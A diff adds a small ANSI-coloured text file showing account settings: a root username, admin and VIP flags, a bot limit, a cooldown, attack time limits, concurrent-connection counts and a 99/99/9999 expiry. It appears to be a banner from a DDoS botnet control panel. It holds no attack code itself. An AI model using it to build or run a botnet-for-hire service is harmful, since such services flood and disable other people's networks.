@@ -1,0 +1,9 @@
+  [90;40mUsername:[96;40mroot
+  [90;40mMaxBots:[96;40mlimited         
+  [96;40mAdmin
+  [90;40mExpdate:[96;40m99/99/9999   
+  [90;40mCoolDown:[96;40m15Sec
+  [90;40mtimeLimit:[96;40m7500
+  [90;40mApitimeLimit:[96;40m750
+  [90;40mVIP:[96;40mYES
+  [90;40mCons:[96;40m7777
